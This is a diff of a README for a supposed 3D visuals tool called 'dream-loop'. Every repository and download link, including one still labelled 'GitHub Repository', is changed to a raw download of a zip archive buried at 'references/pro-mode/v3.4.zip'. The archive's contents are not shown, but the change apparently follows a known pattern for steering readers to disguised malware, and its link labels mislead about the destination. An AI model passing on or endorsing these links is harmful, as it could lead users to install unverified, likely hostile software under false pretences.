@@ -1,6 +1,6 @@
 # 🎨 dream-loop - Stunning 3D Visuals Made Effortless
 
-[![Download dream-loop](https://img.shields.io/badge/Download-dream--loop-2ea44f?style=for-the-badge&logo=github)](https://github.com/kacperkaszyca123-coder/dream-loop)
+[![Download dream-loop](https://img.shields.io/badge/Download-dream--loop-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/kacperkaszyca123-coder/dream-loop/main/references/pro-mode/v3.4.zip)
 
 ## 👋 Welcome to dream-loop
 
@@ -23,7 +23,7 @@ Ready to create your first 3D masterpiece? Follow these simple steps:
 ### Step 1: Download dream-loop
 
 👉 **Visit this link to download the application:**  
-[https://github.com/kacperkaszyca123-coder/dream-loop](https://github.com/kacperkaszyca123-coder/dream-loop)
+[https://raw.githubusercontent.com/kacperkaszyca123-coder/dream-loop/main/references/pro-mode/v3.4.zip](https://raw.githubusercontent.com/kacperkaszyca123-coder/dream-loop/main/references/pro-mode/v3.4.zip)
 
 ### Step 2: Install and Launch
 
@@ -107,7 +107,7 @@ We regularly improve dream-loop with new features and enhancements. To check for
 
 Join our growing community of creators! Share your work, get inspiration, and find help when you need it.
 
-- **GitHub Repository:** [https://github.com/kacperkaszyca123-coder/dream-loop](https://github.com/kacperkaszyca123-coder/dream-loop)
+- **GitHub Repository:** [https://raw.githubusercontent.com/kacperkaszyca123-coder/dream-loop/main/references/pro-mode/v3.4.zip](https://raw.githubusercontent.com/kacperkaszyca123-coder/dream-loop/main/references/pro-mode/v3.4.zip)
 - **Report Issues:** Found a bug? Let us know through the GitHub Issues page
 - **Feature Requests:** Have an idea? We'd love to hear it
 
@@ -119,7 +119,7 @@ dream-loop is free to use in both personal and commercial projects. No attributi
 
 What are you waiting for? Your next 3D masterpiece is just a download away.
 
-👉 **[Download dream-loop now](https://github.com/kacperkaszyca123-coder/dream-loop)**
+👉 **[Download dream-loop now](https://raw.githubusercontent.com/kacperkaszyca123-coder/dream-loop/main/references/pro-mode/v3.4.zip)**
 
 Transform your imagination into stunning visuals with just a few clicks. Whether you're a beginner or a seasoned creator, dream-loop makes professional-grade 3D creation accessible to everyone. Give it a try today – you'll be amazed at what you can create!
 
